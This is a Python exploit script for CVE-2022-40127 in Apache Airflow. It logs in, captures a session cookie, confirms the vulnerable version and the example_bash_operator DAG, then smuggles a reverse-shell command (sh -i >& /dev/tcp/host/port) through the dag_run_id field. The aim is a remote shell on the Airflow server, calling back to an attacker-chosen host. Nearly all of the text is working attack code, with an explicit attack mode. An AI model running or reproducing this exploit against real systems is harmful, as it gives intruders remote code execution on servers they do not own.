# @jakabakos
# version: 1.1
# Tested with Airflow 2.5.0 and MySQL provider 3.4.0
# Apache Airflow REST API reference: https://airflow.apache.org/docs/apache-airflow/stable/stable-rest-api-ref.html

import argparse
import re
import requests
import json
from packaging import version

def get_csrf_token(url):
    """Get the CSRF token from the login page response"""
    # Send a GET request to the login page to retrieve the HTML content
    response = requests.get(url + "/login/")

    # Use regular expression to find the CSRF token from the response HTML
    pattern = r'<input(?:\s+(?:(?:type|name|id)\s*=\s*"[^"]*"\s*)+)?\s+value="([^"]+)">'
    csrf_token = re.search(pattern, response.text)
    
    # Extract the initial session cookie from the response
    initial_session_cookie = response.cookies.get('session')

    # Check if CSRF token is found in the response and return the session cookie and the token
    if csrf_token:
        print("[+] CSRF token found.")
        return initial_session_cookie, csrf_token.group(1)
    else:
        # If CSRF token is not found, print an error message and exit the script
        print("[-] CSRF token not found. Exiting...")
        exit(1)

def login(url, username, password, cookie, csrf_token):
    """Login to the Apache Airflow web application"""
    # Prepare the login data with CSRF token, username, and password
    data = {"csrf_token": csrf_token, "username": username, "password": password}

    # Send a POST request to the login page with the login data and session cookie
    response = requests.post(
        url + "/login/",
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": f"session={cookie}"
        },
        data=data
    )

    # Check if the login was successful or if there was an error
    if "Invalid login. Please try again." in response.text:
        print("[+] Login was not successful due to invalid credentials.")
        exit(1)
    elif response.status_code != 200:
        print("[-] Something went wrong with the login process.")
    elif "Set-Cookie" in response.headers:
        # If login was successful, extract the new session cookie from the response headers
        session_cookie = response.headers["Set-Cookie"].split(";")[0].split("=")[1]
        print(f"[+] Login was successful. Captured session cookie: {session_cookie}")
        return session_cookie

def check_airflow_version(url, session_cookie):
    """Check the version of Apache Airflow"""
    # Send a GET request to the Airflow home page to retrieve the HTML content
    response = requests.get(
        url + "/home",
        headers={"Cookie": f"session={session_cookie}"}
    )

    # Use regular expression to find the version string from the response HTML
    version_str = re.search(r'v(\d+\.\d+\.\d+)', response.text)

    # Check if the version string is found in the response and extract the version number
    if version_str:
        print(f"[+] Airflow version found: {version_str.group(1)}")
        return version_str.group(1)
    else:
        # If version string is not found, print an error message and exit the script
        print("[-] Airflow version not found.")
        exit(1)

def check_example_bash_operator_exists(url, session_cookie):
    """Check if the example_bash_operator DAG exists in Apache Airflow"""
    # Prepare the API endpoint to get the list of DAGs
    endpoint = f'{url}/api/v1/dags'

    # Send a GET request to the API endpoint with the session cookie
    response = requests.get(endpoint, headers={'Cookie': f'session={session_cookie}'})

    # Parse the JSON response to extract the list of DAGs
    response_data = response.json()

    # Check if the example_bash_operator DAG is present in the list of DAGs
    if any(dag["dag_id"] == "example_bash_operator" for dag in response_data['dags']):
        return True
    return False

def upload_reverse_shell(url, session_cookie, host, port):
    """Upload a reverse shell to the Apache Airflow server"""
    # Prepare the payload to execute the reverse shell command
    payload = f'\";sh -i >& /dev/tcp/{host}/{port} 0>&1;\""'
    print(f"[+] Using the following payload: {payload}")

    # Prepare the data for the API request to trigger the reverse shell
    data = {"conf": {},"dag_run_id": payload}

    # Set the headers for the API request
    headers = {
        "accept": "application/json",
        "Content-Type": "application/json",
        "Cookie": f"session={session_cookie}"
    }

    # Send a POST request to the API endpoint to trigger the reverse shell
    response = requests.post(
        f"{url}/api/v1/dags/example_bash_operator/dagRuns",
        headers=headers,
        json=data
    )

    # Parse the JSON response from the API
    response_data = response.json()

    # Check if the request was successful or if there was an error
    if response.status_code == 200:
        print(f"[+] Exploit seems to work. Wait for a connection on port {port}.")
    else:
        print("[-] Something is wrong with the exploit. Here is the response data:")
        print(response.text)

def main():
    """Main function to run the exploit script"""
    # Parse command-line arguments using argparse
    parser = argparse.ArgumentParser(description="CVE-2022-40127 Apache Airflow example_bash_operator RCE exploit script.")
    parser.add_argument("-u", "--username", required=True, help="Airflow username")
    parser.add_argument("-p", "--password", required=True, help="Airflow password")
    parser.add_argument("-url", required=True, help="URL of the Apache Airflow host. Use http(s):// prefix.")
    parser.add_argument("-s", "--session_cookie", help="Session cookie if you already have it")
    parser.add_argument("-a", "--attack", action="store_true", help="Create a reverse shell on the host")
    parser.add_argument("-host", "--rev-shell-host", help="Reverse shell IP/host to bind to from Airflow server")
    parser.add_argument("-port", "--rev-shell-port", help="Reverse shell port to bind to from Airflow server")
    args = parser.parse_args()

    # Check if both username and password or session_cookie are provided
    if not (args.username and args.password) and not args.session_cookie:
        print("[-] Either provide username and password or session cookie.")
        exit(1)

    # Validate URL schema
    url = args.url
    if not url.startswith("http://") and not url.startswith("https://"):
        print("[-] Invalid URL scheme. It should start with 'http://' or 'https://'.")
        exit(1)
    url = url.rstrip("/")

    # Check if both host and port are provided
    if args.attack and not (args.rev_shell_host and args.rev_shell_port):
        print("[-] The host ip and port for the reverse shell to bind to should also be provided in attack mode. Exiting...")
        exit(1)

    # Get the session cookie
    if args.session_cookie:
        session_cookie = args.session_cookie
    else:
        # If session cookie is not provided, get CSRF token and perform login to get the session cookie
        initial_session_cookie, csrf_token = get_csrf_token(url)
        session_cookie = login(url, args.username, args.password, initial_session_cookie, csrf_token)

    # Verify Airflow version and check if it's vulnerable
    airflow_version = check_airflow_version(url, session_cookie)
    if version.parse(airflow_version) < version.parse("2.4.0"):
        print("[+] Version is vulnerable.")
    else:
        print("[-] Not vulnerable. Version is above 2.3.4. Exiting...")

    # Check if the example_bash_operator DAG exists
    if check_example_bash_operator_exists(url, session_cookie):
        print("[+] Yay! The example_bash_operator example DAG exists.")
    else:
        print("[-] No example_bash_operator DAG exists. Exploitation is not possible. Exiting...")
        exit(1)

    # If attack mode is selected, proceed with uploading the reverse shell
    if args.attack:
        print("[+] Proceeding with the exploit. Trying to upload a reverse shell.")
        upload_reverse_shell(url, session_cookie, args.rev_shell_host, args.rev_shell_port)
    else:
        print("[+] Exploit seems to work. Run the script with \"-a\" option to get a reverse shell.")

if __name__ == "__main__":
    main()

